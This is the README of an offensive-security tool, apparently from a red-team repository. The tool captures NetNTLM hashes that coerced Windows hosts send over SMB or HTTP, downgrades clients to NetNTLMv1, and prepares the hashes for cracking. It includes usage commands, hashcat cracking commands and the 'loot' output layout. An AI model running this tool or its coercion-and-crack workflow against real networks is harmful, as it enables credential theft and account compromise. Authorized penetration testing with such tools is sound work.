# ntlm-catch

A deliberately tiny, single-file **NetNTLM capture listener** for coercion work.
It stands up **SMB (445)** and/or **HTTP (80)** endpoints that answer with an
NTLM challenge, hand out a **fixed server challenge**, try to **downgrade the
client to NetNTLMv1**, then parse and log the Type-3 response in full and write
hashcat-ready lines.

It is **listener-only** by design — built to sit at the end of a coercion:

- **No poisoning** — no LLMNR / NBT-NS / mDNS. You point coerced auth at it:
  - **SMB / 445** ← PetitPotam, PrinterBug (MS-RPRN), DFSCoerce, `\\attacker\x` UNC
  - **HTTP / 80** ← WebDAV coercion, Exchange PushSubscription, `@80` tricks
- **No relay, no payloads** — it only records what authenticates to it.
- **Never silent** — it prints a line the instant a TCP connection is accepted,
  before any protocol parsing, so if `tcpdump` shows packets you see them here
  too. (Stock Responder only logs on a *successful* NTLM parse **and** buffers
  its stdout — which is why it can look dead while traffic is arriving.)

Pure Python 3.7+ standard library. No dependencies.

> Authorized security testing only.

Local lab notes, generated bait documents, and captured credentials are ignored
by Git. Keep them outside release archives.

---

## Transport vs. version — the thing people get wrong

**NetNTLM (v1 and v2) is the same NTLMSSP Type-1/2/3 exchange on every
transport.** It rides over SMB (445), HTTP (80), LDAP (389), MSSQL, RPC… The
messages are identical; only the wrapper differs (SMB `SESSION_SETUP` / SPNEGO
vs. the HTTP `Authorization: NTLM` header).

Whether you get **v1 or v2** is decided by the client's `LmCompatibilityLevel`
plus the **ESS flag** in *our* challenge — **not by the port**. So:

- Which **port** fires depends on the **coercion method**, not on the tool.
  PetitPotam/PrinterBug/DFSCoerce → **445**. That is why you need an SMB
  listener for classic coercion, and why `ntlm-catch` runs one.
- **Downgrade** = clearing `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY`
  (`0x00080000`) in the challenge (flags `…89e2` → `…81e2`). Clients with
  `LmCompatibilityLevel ≤ 2` then return **NetNTLMv1**; hardened clients
  (≥ 3, the modern default) still send v2. Hence *"downgrade where possible"* —
  both are captured, and the tool tells you which happened.

Why bother with v1: a fixed challenge of `1122334455667788` makes any captured
**NetNTLMv1** crackable in seconds via the [crack.sh](https://crack.sh) DES
tables (or `hashcat -m 5500`).

Per-capture verdict:

| Console note | Meaning |
|---|---|
| `downgrade OK — pure NetNTLMv1` | `-m 5500`, crack.sh-friendly |
| `NTLM2 session security (ESS)` | v1 shape but client kept ESS — not crack.sh-friendly |
| `client stayed on NetNTLMv2` | hardened policy, `-m 5600` |

---

## Usage

```bash
# SMB(445) + HTTP(80), fixed challenge, downgrade to v1 (all defaults)
sudo python3 ntlm_catch.py

# SMB only — classic coercion (PetitPotam / PrinterBug / DFSCoerce)
sudo python3 ntlm_catch.py --mode smb

# HTTP only on a high port, no root
python3 ntlm_catch.py --mode http --http-port 8080

# capture v2 as-is (no downgrade), custom challenge
sudo python3 ntlm_catch.py --no-downgrade --challenge 0011223344556677
```

The optional lab helpers generate and serve test documents for an explicitly
authorized environment:

```bash
python3 serve_external_xlsx.py --write-dir ./PUBLIC --port 8080
python3 serve_word_smb.py --smb-host listener.example --write ./PUBLIC/report.docx
```

> **445 already in use?** A local Samba (`smbd`) or Windows will own 445. Stop it
> first: `sudo systemctl stop smbd nmbd`. The tool reports a clear bind error if
> the port is taken.

Key flags (`--help` for all):

| Flag | Default | Purpose |
|---|---|---|
| `--mode {both,smb,http}` | `both` | which listeners to start |
| `-i/--bind` | `0.0.0.0` | interface |
| `--smb-port` / `--http-port` | `445` / `80` | ports |
| `--challenge HEX` | `1122334455667788` | 8-byte server challenge |
| `--downgrade` / `--no-downgrade` | on | clear ESS to request v1 where client policy allows it |
| `--domain`, `--computer` | `CORP` / `EXCH01` | identity in the challenge |
| `--tls` (+ `--cert/--key`) | off | HTTP listener serves HTTPS |
| `-o/--outdir` | `loot` | where hashes + log go |
| `-v/--verbose` | off | per-message SMB/HTTP handshake steps |
| `--socket-timeout` | `15` | report and close incomplete client connections |
| `--no-wire-monitor` | off | disable raw TCP diagnostics for SMB/445 |
| `--wire-interface` | all | restrict raw SMB diagnostics to one interface, e.g. `eth0` |
| `--no-split-view` | off | disable the automatic interactive split view |

When stdout is an interactive terminal (>= 76 columns), the listener
automatically opens a dynamic color dashboard: high-level protocol events and
capture cards appear on the left, while the full colorized raw wire/handshake
stream scrolls on the right. An adaptive header displays active listeners,
downgrade policy, live capture counters (v1/v2), connection count, and an active
heartbeat pulse with live uptime. Terminal resizes (`SIGWINCH`) dynamically
re-render the layout without screen artifacts.

**Interactive Navigation & Scrolling:**

* **`Tab`** or **`←` / `→`**: switch active pane between *EVENTS* and *RAW LOG*.
* **`↑` / `↓`** (or **`k` / `j`**): scroll line by line.
* **`PgUp` / `PgDn`** (or **`u` / `d` / `Space`**): scroll by page.
* **`Home`** / **`End`** (or **`g` / `G`**): jump to beginning / return to live follow mode.
* **Mouse wheel & click**: scroll and select active pane directly with terminal mouse.
* **`q`** / **`Ctrl+C`**: stop listeners and print a clean session summary.

Redirected output and pipes keep the traditional line-by-line streaming format,
and `session.log` always persists plain text with ANSI stripped.

## Output

```
loot/
├── 20261020T143012.123456_smb_10.0.0.5_CORP_user_netntlmv2.txt
│                   # one hash per file, including repeated captures
├── netntlmv1.txt   # hashcat -m 5500 lines (deduped)
├── netntlmv2.txt   # hashcat -m 5600 lines (deduped)
├── capture.log     # every capture, timestamped, source (SMB/HTTP) + client IP
└── session.log     # the FULL console trace: connections, handshake steps,
                    #   captures, errors — persisted so you don't need `tee`
```

The output directory and newly written loot files are restricted to the
current OS user (`0700` for the directory and `0600` for files).

Crack:

```bash
hashcat -m 5500 loot/netntlmv1.txt wordlist.txt      # NetNTLMv1
#   or submit loot/netntlmv1.txt to crack.sh (challenge 1122334455667788)
hashcat -m 5600 loot/netntlmv2.txt wordlist.txt      # NetNTLMv2
```

---

## Verified

End-to-end, both transports:

- **SMB/445** driven by NetExec (`nxc smb`) → full NEGOTIATE → SESSION_SETUP
  handshake, captured `CORP\testuser` NetNTLMv2; the `-m 5600` line cracked
  back to the real password with hashcat. Live coerced auth from real Windows
  hosts on the wire was captured the moment the listener came up.
- **HTTP** driven by `curl --ntlm` with downgrade on → client returned
  **NetNTLMv1**; the `-m 5500` line cracked back to the password.

## Validation

Run the dependency-free regression suite before deployment:

```bash
python3 -m unittest discover -v
python3 -m compileall -q ntlm_catch.py serve_external_xlsx.py serve_word_smb.py
```

The suite covers Type-2 flags, malformed Type-3 bounds, SMB frame limits,
terminal cell sizing, fragmented keyboard input, and concurrent atomic writes.

## systemd deployment

Install the repository read-only at `/opt/ntlm-catch`, copy
`deploy/ntlm-catch.service` to `/etc/systemd/system/`, then review its command
line and capabilities for the target host. The unit runs under a dynamic user,
writes only to `/var/lib/ntlm-catch`, restarts on failure, and permits only the
capabilities needed for privileged listener ports and optional raw diagnostics.

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now ntlm-catch
sudo journalctl -u ntlm-catch -f
```

If raw packet diagnostics are disabled with `--no-wire-monitor`, remove
`CAP_NET_RAW` and `AF_PACKET` from the unit before deployment.

## Troubleshooting "it's silent"

- Every accepted TCP connection prints `[smb|http conn #N] TCP from ip:port`.
  No such line = traffic isn't reaching this process → wrong port, firewall, or
  the coercion used a transport you're not listening on.
- `sent non-SMB data` / TLS `plaintext to HTTPS?` = protocol/port mismatch.
- stdout is line-buffered, so `... | tee run.log` stays live.
